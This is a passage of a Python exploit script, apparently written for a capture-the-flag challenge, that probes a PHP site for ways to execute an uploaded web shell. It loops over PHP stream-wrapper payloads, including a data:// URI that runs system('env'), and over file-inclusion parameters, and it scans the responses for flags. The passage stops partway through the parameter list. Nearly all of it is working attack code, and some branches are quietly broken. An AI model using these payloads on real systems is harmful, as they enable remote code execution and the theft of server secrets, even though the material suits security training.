# Test 2: Try zip:// wrapper
print("\n[*] TEST 2: Try to access uploaded file via PHP wrappers")
wrappers = [
    'php://filter/convert.base64-encode/resource=upload/shell.jpg',
    'php://input',
    'data://text/plain,<?php system("env"); ?>',
    'zip://upload/shell.jpg',
    'phar://upload/shell.jpg',
]
for wrapper in wrappers:
    try:
        if wrapper.startswith('php://filter'):
            r = requests.get(f"{base_url}/index.php", params={'file': 'upload/shell.jpg'})
        elif wrapper.startswith('data://'):
            r = requests.get(f"{base_url}/index.php", params={'file': wrapper})
        else:
            r = requests.get(wrapper)
        if 'FLAG' in r.text:
            print(f"[!!!] FLAG FOUND via {wrapper}")
            flags = re.findall(r'FLAG\{[^}]+\}', r.text)
            print(f"FLAGS: {flags}")
    except:
        pass

# Test 3: Look for include/require in application
print("\n[*] TEST 3: Check for file inclusion via parameters")
include_params = [
    {'page': 'upload/shell.jpg'},
    {'file': 'upload/shell.jpg'},
    {'path': 'upload/shell.jpg'},
    {'include': 'upload/shell.jpg'},
    {'template': 'upload/shell.jpg'},
    {'img': 'upload/shell.jpg'},
    {'image': 'upload/shell.jpg'},
    {'src': 'upload/shell.jpg'},
    {'load': 'upload/shell.jpg'},
